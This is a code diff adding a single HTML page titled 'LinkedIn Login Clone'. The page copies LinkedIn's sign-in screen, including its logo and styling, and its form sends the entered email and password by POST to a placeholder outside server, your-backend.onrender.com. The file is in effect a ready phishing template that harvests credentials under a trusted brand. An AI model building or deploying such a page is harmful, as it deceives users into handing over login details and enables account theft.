@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LinkedIn Login Clone</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f3f2ef;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      position: absolute;
+      top: 30px;
+      left: 30px;
+    }
+
+    .logo img {
+      height: 35px;
+    }
+
+    .login-box {
+      background: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 350px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .login-box h2 {
+      margin-bottom: 20px;
+      font-size: 24px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      padding: 12px;
+      margin-bottom: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .forgot-password {
+      font-size: 14px;
+      color: #0a66c2;
+      text-decoration: none;
+      margin-bottom: 12px;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+
+    .checkbox-container input {
+      margin-right: 8px;
+    }
+
+    button {
+      background-color: #0a66c2;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 24px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .join {
+      font-size: 14px;
+      margin-top: 20px;
+    }
+
+    .join a {
+      color: #0a66c2;
+      text-decoration: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png" alt="LinkedIn Logo">
+  </div>
+  <div class="container">
+    <div class="login-box">
+      <h2>Sign in</h2>
+      <form action="https://your-backend.onrender.com/login" method="POST">
+        <input type="email" name="email" placeholder="Email or phone" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <div class="checkbox-container">
+          <input type="checkbox" id="keepLoggedIn">
+          <label for="keepLoggedIn">Keep me logged in</label>
+        </div>
+        <button type="submit">Sign in</button>
+      </form>
+    </div>
+    <div class="join">
+      New to LinkedIn? <a href="#">Join now</a>
+    </div>
+  </div>
+</body>
+
+</html>
